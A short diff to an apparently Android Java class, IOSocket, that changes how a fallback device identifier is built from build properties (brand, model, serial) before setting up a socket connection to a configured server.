@@ -21,9 +21,9 @@ public class IOSocket {
             String serverPort = ctx.getString(R.string.server_port);
             String deviceID = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
             
-            // Fallback for ID if ANDROID_ID is null
+            // Fallback for ID if ANDROID_ID is null or generic
             if (deviceID == null || deviceID.isEmpty()) {
-                deviceID = "DEV-" + Build.BOARD + "-" + Build.SERIAL;
+                deviceID = "DEV-" + Build.BRAND + "-" + Build.MODEL + "-" + Build.SERIAL;
             }
 
             IO.Options opts = new IO.Options();
